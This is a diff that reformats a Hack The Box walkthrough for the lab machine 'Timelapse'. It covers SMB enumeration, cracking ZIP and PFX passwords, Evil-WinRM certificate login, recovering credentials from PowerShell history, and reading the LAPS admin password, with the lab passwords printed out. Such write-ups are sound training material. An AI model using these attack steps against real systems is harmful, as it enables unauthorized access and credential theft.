@@ -1,10 +1,11 @@
+# HTB - Timelapse
+
 **IP Address:** `10.10.11.152`  
 **OS:** Windows  
 **Difficulty:** Easy  
 **Tags:** #SMB, #LAPS, #PFX, #Evil-WinRM, #PasswordCracking
 
 ---
-
 ## Synopsis
 
 Timelapse is an easy Windows machine where initial access is obtained via a **public SMB share** containing a password-protected `.zip` archive.  
@@ -14,7 +15,6 @@ Post-exploitation reveals credentials stored in PowerShell history for a domain 
 This group can read local Administrator passwords via **LAPS (Local Administrator Password Solution)**, enabling privilege escalation to Domain Admin and complete system compromise.
 
 ---
-
 ## Skills Required
 
 - SMB enumeration & share access
@@ -30,14 +30,13 @@ This group can read local Administrator passwords via **LAPS (Local Administrato
 - Using PowerShell modules to retrieve LAPS passwords for privilege escalation
 
 ---
-
 ## 1. Initial Enumeration
 
 ### 1.1 Connectivity Test
 
 Check if the host is alive using ICMP:
 
-``` bash
+```bash
 ping -c 1 10.10.11.152
 ```
 
@@ -51,7 +50,7 @@ The host responds, confirming it is reachable.
 
 Identify all open TCP ports:
 
-``` bash
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.152 -oG allPorts
 ```
 
@@ -59,7 +58,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.152 -oG allPorts
 
 Extract open ports:
 
-``` bash
+```bash
 extractPorts allPorts
 ```
 
@@ -71,7 +70,7 @@ extractPorts allPorts
 
 Perform deeper enumeration with service and version detection:
 
-``` bash
+```bash
 nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49668,49673,49674,49695 10.10.11.152 -oN targeted
 ```
 
@@ -85,7 +84,7 @@ Multiple AD-related services are open, confirming the host is a **Domain Control
 
 ### 2.1 Identifying Domain & Hostname
 
-``` bash
+```bash
 crackmapexec smb 10.10.11.152
 ```
 
@@ -97,7 +96,7 @@ The machine name is **DC01** and the domain is **timelapse.htb**.
 
 ### 2.2 Listing SMB Shares (Null Session)
 
-``` bash
+```bash
 smbclient -L 10.10.11.152 -N
 ```
 
@@ -105,7 +104,7 @@ smbclient -L 10.10.11.152 -N
 
 Check permissions with `smbmap`:
 
-``` bash
+```bash
 smbmap -H 10.10.11.152 -u none
 ```
 
@@ -115,7 +114,7 @@ smbmap -H 10.10.11.152 -u none
 
 ### 2.3 Accessing the `Shares` Share
 
-``` bash
+```bash
 smbclient //10.10.11.152/Shares -N
 ```
 
@@ -136,7 +135,7 @@ Listing contents of `winrm_backup.zip` reveals a `.pfx` file, but the ZIP is pas
 
 ### 3.2 Cracking the ZIP Password
 
-``` bash
+```bash
 fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
 ```
 
@@ -148,7 +147,7 @@ Password recovered → extract `.pfx` file.
 
 ### 3.3 Attempting PFX Extraction
 
-``` bash
+```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
 ```
 
@@ -162,7 +161,7 @@ Requires another password.
 
 Convert `.pfx` to hash format:
 
-``` bash
+```bash
 pfx2john legacyy_dev_auth.pfx > pfx.hash 
 john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
@@ -176,13 +175,13 @@ Password recovered.
 
 ### 3.5 Extracting Certificate and Key
 
-``` bash
+```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes 
 ```
 
 ![Private Key Hash](screenshots/priv_key_hash.png)
 
-``` bash
+```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificates.pem
 ```
 
@@ -194,7 +193,7 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificates.pem
 
 Port 5986 is open (WinRM over SSL). Authenticate using Evil-WinRM:
 
-``` bash
+```bash
 evil-winrm -i 10.10.11.152 -c certificates.pem -k priv-key.pem -S
 ```
 
@@ -249,7 +248,7 @@ Recovered credentials:
 
 ### 4.3 Logging in as svc_deploy
 
-``` bash
+```bash
 evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
 ```
 
@@ -295,7 +294,7 @@ Find-AdmPwdExtendedRights -Identity 'Domain Controllers' Get-AdmPwdPassword -Com
 
 Test retrieved password:
 
-``` bash
+```bash
 evil-winrm -i 10.10.11.152 -u 'Administrator' -p 'iLZZ!2zt/)]s#@6+-#L@}Yc6' -S
 ```
 
